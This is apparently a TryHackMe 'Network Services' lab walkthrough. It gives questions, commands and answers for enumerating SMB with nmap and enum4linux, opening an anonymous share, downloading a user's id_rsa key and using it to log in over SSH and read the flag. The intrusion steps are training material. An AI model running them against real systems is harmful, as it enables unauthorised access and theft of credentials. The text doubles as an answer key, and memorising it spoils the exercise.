Room: https://tryhackme.com/room/networkservices
Name: Network Services
///Task 3///
===
Conduct an nmap scan of your choosing, How many ports are open?
** nmap -sC -p 1-1024
3
===
What ports is SMB running on?
139/445
===
Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?    
**  enum4linux -G 10.10.223.88
workgroup
===
What comes up as the name of the machine?        
** nmap -sC -p 1-1024
polosmb
===
What operating system version is running?    
** nmap -sC -p 1-1024
6.1
===
What share sticks out as something we might want to investigate?    
profiles

///Task 4///
===
What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
smbclient //10.10.10.2/secret -U suit -p 445
===
Does the share allow anonymous access? Y/N?
** smbclient //machine_ip/profiles -U Anonymous -p 445
Y
===
Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
** ls
** more "Working From Home Information.txt"
john cactus
===
What service has been configured to allow him to work from home?
ssh (as of "Working From Home Information.txt")
===
Okay! Now we know this, what directory on the share should we look in?
** ls
.ssh
===
This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
** cd .ssh
** ls
id_rsa
===
Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".
** cd .ssh
** ls
** mget id_rsa*       [for "** mget id_rsa*" answer all with yes or y]
Open new terminal (leave ssh open)
** ls                 ["ls" on homescreen]
chmod 600 id_rsa
** cp id_rsa .ssh
** cp id_rsa-pub .ssh
** ssh cactus@machine_ip
===
What is the smb.txt flag?
** ls
** nano smb.txt
THM{smb_is_fun_eh?}